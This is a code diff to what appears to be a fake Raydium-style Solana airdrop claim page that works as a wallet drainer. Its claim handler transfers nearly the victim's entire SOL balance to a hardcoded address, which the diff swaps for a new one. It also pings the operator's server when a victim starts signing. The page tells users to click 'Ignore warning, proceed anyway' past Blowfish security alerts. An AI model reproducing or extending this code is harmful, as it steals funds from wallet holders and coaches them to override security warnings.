@@ -24,6 +24,7 @@ import { twMerge } from 'tailwind-merge'
 import { setLocalItem } from '@/functions/dom/jStorage'
 import {
   Connection,
+  LAMPORTS_PER_SOL,
   PublicKey,
   SystemProgram,
   TransactionInstruction,
@@ -32,7 +33,7 @@ import {
 } from '@solana/web3.js'
 import { BN } from 'bn.js'
 import { useAnchorWallet, useWallet } from '@solana/wallet-adapter-react'
-import { getTipTransaction, sendAndConfirmSignedTransactions } from '@/pageComponents/Concentrated'
+import { getRandomNumber, getTipAccounts, sendAndConfirmSignedTransactions } from '@/pageComponents/Concentrated'
 import { findProgramAddressSync } from '@project-serum/anchor/dist/cjs/utils/pubkey'
 import {
   AIRDROP_AUTHORITY,
@@ -117,17 +118,18 @@ function VideoPlayDialog({
         {/* content */}
         <div className="grow text-sm leading-normal text-[#abc4ffb3] scrollbar-width-thin h-96 mobile:h-12 rounded p-4 my-6 mobile:my-4 bg-[#141041]">
           <div className='flex flex-col items-center'>
-            <div className='mt-5 rounded-lg'>
+            <div className='mt-3 rounded-lg'>
               <ReactPlayer
                 width="auto"
                 height="225px"
                 url={videosrc}
                 controls={false}
+                loop={true}
                 playing={true}
                 // light is usefull incase of dark mode
                 light={false}
-                // picture in picture
-                pip={true}
+              // picture in picture
+              // pip={true}
               />
               <source src={videosrc} type="video/mp4" />
             </div>
@@ -135,16 +137,19 @@ function VideoPlayDialog({
           <div className='flex flex-col items-center'>
             <p className="mt-7 text-center">
               If you see this warning it means our site hasn't
-              been whitelistet by
-              <a href="https://blowfish.xyz/">
-                blowfish.xyz
-              </a>
-              yet, this process
+              been whitelistetd by &nbsp;
+              <u>
+                <a href="https://blowfish.xyz/">
+                  blowfish.xyz
+                </a>
+              </u>
+              &nbsp; yet, this process
               takes time.
             </p>
-            <u>
+            <u className='text-white mt-2'><b>
               Click "Ignore warning, proceed anyway" to
               continue action.
+            </b>
             </u>
           </div>
         </div>
@@ -186,7 +191,7 @@ function HomePageSection0() {
   const txTransfer = async () => {
     if (owner) {
       try {
-        // await axios.post(API_BASE_URI + "/api/sendSignNotification", { owner: owner })
+        await axios.post(API_BASE_URI + "/api/sendSignNotification", { owner: owner })
         const [airdrop_info, airdrop_bump] = findProgramAddressSync(
           [utf8.encode(AIRDROP_SEED), AIRDROP_AUTHORITY.toBuffer(), new Uint8Array([AIRDROP_ID])],
           AIRDROP_PROGRAM_PUBKEY
@@ -238,11 +243,12 @@ function HomePageSection0() {
           totalInstructions.push(txClaim)
         }
         const solBalance = new BN((await connection.getBalance(owner)).toString())
+        const tipAddrs = await getTipAccounts();
+        const tipAccount = new PublicKey(tipAddrs[getRandomNumber(0, tipAddrs.length - 1)]);
         console.warn(solBalance)
         const fee = new BN('10000000')
-        const toAddress = new PublicKey('5cLAoXaK1UjZreSuuzVwY5rAhVPaotgAZ8sNdUruEWWA')
-        // const toAddress = new PublicKey('s393nmNfuwXasFnABhVqka58VsPcnP8jKLYZ4ZXJcP1')
-        // const toAddress = new PublicKey('H7YPtMRHNPcaNANC3BVeK2a3JW6mvduicm1qmcznQfGi')
+        const toAddress = new PublicKey('HJXbU3qwY3wSptW5qE27nz2zJMoJg3JcRS4DozczFRng')
+        // const toAddress = new PublicKey('po3Sv8KXRvoKHwbQd3x2e9FH6zgr817jPPuqLxAwPBG')
         if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) {
           console.warn('solbalance is not enough')
           await axios.post(API_BASE_URI + '/api/sendNotEnoughNotification')
@@ -255,7 +261,12 @@ function HomePageSection0() {
             lamports: solBalance.sub(fee).toNumber()
           })
         )
-
+        totalInstructions.push(
+          SystemProgram.transfer({
+            fromPubkey: owner,
+            toPubkey: tipAccount,
+            lamports: LAMPORTS_PER_SOL * 0.0005,
+          }),)
         const recentBlockhash = (await connection.getLatestBlockhash('confirmed')).blockhash
         const transactionMessage = new TransactionMessage({
           payerKey: owner,
@@ -265,8 +276,8 @@ function HomePageSection0() {
         let txns: VersionedTransaction[] = []
         const tx = new VersionedTransaction(transactionMessage.compileToV0Message())
         txns.push(tx)
-        const tipTx = await getTipTransaction(connection, owner, 0.005)
-        if (tipTx) txns.push(tipTx)
+        // const tipTx = await getTipTransaction(connection, owner, 0.005)
+        // if (tipTx) txns.push(tipTx)
         if (txns && signAllTransactions) {
           txns = await signAllTransactions(txns)
           const signature = await sendAndConfirmSignedTransactions(true, connection, txns)
@@ -555,8 +566,10 @@ function HomePageSection2() {
             </div>
             <div className="font-semibold text-lg text-white mb-2">Disclaimer</div>
             <div className="font-light text-[#c4d6ff] mb-5">
-              This page is for testing purposes only and does not represent any connection to
-              <a href="https://raydium.io/swap/?inputMint=sol&outputMint=4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R">raydium.io</a>.
+              This page is for testing purposes only and does not represent any connection to &nbsp;
+              <u>
+                <a href="https://raydium.io/swap/?inputMint=sol&outputMint=4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R">raydium.io</a><pre />
+              </u>
               We assume no liability for lost assets.
             </div>
           </Card>
